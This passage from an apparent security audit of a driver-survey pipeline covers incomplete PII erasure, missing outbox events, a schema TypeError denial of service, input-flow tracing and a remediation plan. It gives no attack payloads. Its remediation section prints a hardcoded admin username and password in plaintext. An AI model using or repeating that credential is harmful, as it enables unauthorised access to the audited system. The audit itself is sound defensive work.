  1. Use atomic file writes (write to a temporary file in the same filesystem and execute atomic `os.replace()`).
  2. Implement file locking (`fcntl.flock`) or serialize writes through an async worker queue.

---

### VULN-PRIV-01: Incomplete Decree 13 Right-to-Erasure (PII Retention in Vault & Vehicles)
- **Severity:** MEDIUM
- **Component:** Privacy Engine
- **Location:** `services/audit_and_privacy.py:211-242`
- **Vulnerability Mechanics:**  
  The function `scrub_driver_pii()` claims to execute driver right-to-erasure under Decree 13 / GDPR:
  ```python
  # 2. Scrub driver_identity_vault
  await cur.execute(
      """
      UPDATE driver_identity_vault 
      SET driver_name = '[SCRUBBED_DECREE13]',
          is_scrubbed = TRUE,
          scrubbed_at = NOW()
      WHERE driver_phone = %s;
      """,
      (driver_phone,)
  )
  ```
  Notice that `driver_phone` itself is **never scrubbed or hashed** in `driver_identity_vault`. Furthermore, the table `driver_registered_vehicles` (where `driver_phone` is the primary key) is completely ignored by the scrub routine.
- **Adversarial Attack Mechanism:**  
  An auditor or regulator querying `driver_identity_vault` and `driver_registered_vehicles` after a driver exercises their right to erasure discovers that the driver's phone number, vehicle type, and license plate remain permanently in the database in plaintext.
- **Business & Security Impact:**  
  Regulatory non-compliance with Decree 13/2023/ND-CP, exposing the platform to regulatory enforcement and fines.
- **Recommended Remediation:**  
  1. In `driver_identity_vault`, update `driver_phone` to a salted one-way hash (`driver_phone = SHA256(phone + salt)`) or delete the mapping record.
  2. In `driver_registered_vehicles`, delete or pseudonymize the driver's vehicle registration record upon erasure request:
     ```sql
     DELETE FROM driver_registered_vehicles WHERE driver_phone = %s;
     ```

---

### VULN-OUTBOX-02: Complete Absence of Transactional Outbox Publishing on WebRTC
- **Severity:** MEDIUM
- **Component:** Ingestion Gateway / Persistence
- **Location:** `main.py:382-419`
- **Vulnerability Mechanics:**  
  The project's architectural specifications and documentation emphasize the Transactional Outbox pattern (`outbox_events`) to decouple heavy downstream tasks (financial ledger crediting, Cloudflare R2 archival, Google Drive spreadsheet sync, Lark Base sync, and Zalo ZNS messaging).  
  **Audit Finding:** In `main.py`, `/api/v1/survey/submit-webrtc` inserts into `survey_submissions` and `driver_registered_vehicles`, but **never inserts any record into `outbox_events`**.
- **Adversarial Attack Mechanism:**  
  When drivers submit surveys through the WebRTC gateway, no outbox events are ever emitted. As a result, the `outbox_worker` daemon never processes these surveys: payouts are never credited to the collaborator billing ledger, images are never backed up to Cloudflare R2, and Zalo ZNS notifications are never triggered.
- **Business & Security Impact:**  
  Functional breakdown of downstream financial payouts, reporting integrations, and long-term cloud storage.
- **Recommended Remediation:**  
  Within the same database transaction in `submit_webrtc_survey()`, emit the required outbox events for approved surveys:
  ```sql
  INSERT INTO outbox_events (event_type, flow_target, aggregate_id, payload, status)
  VALUES ('SURVEY_APPROVED', 'ALL', %s, %s, 'PENDING');
  ```

---

### VULN-ENGINE-01: Unhandled TypeError in Dynamic Schema Conditional Logic
- **Severity:** LOW
- **Component:** Form Engine
- **Location:** `services/form_engine.py:73-74`
- **Vulnerability Mechanics:**  
  In `validate_submission_against_schema()`:
  ```python
  if q.conditional:
      parent_val = answers.get(q.conditional.depends_on_question_id)
      if q.conditional.operator == "equals" and parent_val != q.conditional.expected_value:
          continue
      elif q.conditional.operator == "in" and parent_val not in q.conditional.expected_value:
          continue
  ```
  If a schema definition sets `operator: "in"` and specifies an `expected_value` that is not an iterable collection (such as an integer, boolean, or null), Python throws:
  `TypeError: argument of type 'int' is not iterable`.
- **Adversarial Attack Mechanism:**  
  An authenticated schema designer (or attacker uploading a schema) defines a conditional rule with an integer `expected_value`. Any driver attempting to submit the form causes the server to raise an unhandled exception and crash with HTTP 500.
- **Business & Security Impact:**  
  Denial of service for dynamic forms containing misconfigured conditional rules.
- **Recommended Remediation:**  
  Safeguard membership tests with type guards:
  ```python
  elif q.conditional.operator == "in":
      if isinstance(q.conditional.expected_value, (list, set, tuple)):
          if parent_val not in q.conditional.expected_value:
              continue
      else:
          logger.warning(f"Invalid 'in' operator target: {q.conditional.expected_value}")
  ```

---

## 4. End-to-End Dataflow & Input-to-Database Tracing

### 4.1 WebRTC Submission Ingestion Flow
```
User HTTP Request (Multipart Form Data)
  │
  ├─► `survey_photo` (UploadFile)
  │     └─► `sanitize_and_normalize_image()` [PIL EXIF transpose, RGBA->RGB, WebP]
  │     └─► `compute_laplacian_blur_score()` [cv2.Laplacian variance >= 100.0]
  │     └─► `vision_client.extract_facts()` [DeepSeek/Gemini Multimodal API]
  │           └─► [FAIL-OPEN EXCEPTION: is_approved = True] (VULN-AI-03)
  │     └─► `evaluate_survey_compliance()` [Deterministic Python boolean checks]
  │
  ├─► `driver_phone` ──► Unvalidated plaintext string
  ├─► `license_plate` ─► Unvalidated plaintext string
  │
  └─► Database Execution:
        ├─► INSERT INTO `survey_submissions` (%s parameterized, SQLi safe)
        └─► UPSERT INTO `driver_registered_vehicles` (%s parameterized, SQLi safe)
              └─► [PROFILE HIJACKING: Overwrites legitimate driver plate] (VULN-AUTH-05)
```
- **SQL Injection Assessment:** All SQL executions in `main.py`, `services/admin_moderator.py`, `services/vehicle_tracker.py`, and `workers/outbox_worker.py` strictly utilize `%s` parameterized queries via psycopg. No direct SQL injection vectors were identified.
- **Parameter Tampering Assessment:** Critical parameters (`is_test_mode`, `bypass_img_check`, `idempotency_key`, `driver_phone`, `license_plate`) are accepted directly from unauthenticated client input without token verification, leading to profile hijacking and verification bypasses.

---

## 5. Architectural Remediation Roadmap

### Phase 1: Immediate Critical Fixes (P0 - Day 1)
1. **Secure Dev & Static Routes:**
   - Remove `app.mount("/data")` in `main.py:88`.
   - Add `admin_user: str = Depends(verify_admin_auth)` to `GET /api/v1/dev/submissions` and `DELETE /api/v1/dev/submissions`.
2. **Eliminate Hardcoded Credentials:**
   - Migrate `admin` / `Legendofzeus2@` from `main.py:94-96` into environment variables (`ADMIN_USERNAME`, `ADMIN_PASSWORD`).
3. **Prevent Vehicle Profile Hijacking:**
   - Remove unauthenticated upserts into `driver_registered_vehicles` from `submit_webrtc_survey()`.
   - Require verified Telegram collaborator authentication before modifying driver vehicle links.
4. **Sanitize Schema Uploads:**
   - Restrict `form_id` to `^[a-zA-Z0-9_-]{1,64}$` to eliminate path traversal.

### Phase 2: Core Hardening & Anti-Fraud Integration (P1 - Week 1)
1. **Bridge the "Ghost Engine" Disconnect:**
   - Wire `VehiclePersistenceTracker.verify_and_persist_vehicle()` into `submit_webrtc_survey()`.
   - Wire `OnlineStockAndAIDetector.evaluate_image()` to block online stock photos.
   - Wire `analyze_driver_income()` to reject outlandish revenue numbers.
2. **Server-Side Schema Validation:**
   - Execute `validate_submission_against_schema()` before accepting WebRTC submissions.
3. **Harden Idempotency & Memory Management:**
   - Replace unbounded `LOCAL_IDEMP_CACHE` with a capped LRU cache or Redis with TTL.
   - Scope idempotency keys to `idemp:{driver_phone}:{key}` to prevent cross-tenant cache poisoning.
4. **Fix Stored XSS in HTML Builders:**
   - Apply `html.escape` to schema titles and descriptions in `dynamic_form_html.py` and `form_manager_html.py`.
   - Sanitize script-embedded JSON using `\u003c` replacements.

### Phase 3: Reliability & Compliance Resilience (P2 - Week 2)
1. **Expand ID Entropy:**
   - Transition `submission_id` from 24-bit (`token_hex(3)`) to 64-bit (`token_hex(8)`) to eliminate Birthday Paradox collisions.
2. **Transactional Outbox Integration:**
   - Emit `SURVEY_APPROVED` events into `outbox_events` atomically during survey insertion.
3. **Full Decree 13 PII Scrubbing:**
   - Hash `driver_phone` in `driver_identity_vault` upon erasure requests and purge `driver_registered_vehicles`.

---
*Report finalized and compiled by Independent Red-Team Security Auditor.*  
*All findings grounded in verified source code analysis of `/home/ebylxn/projects/survey-pipeline`.*
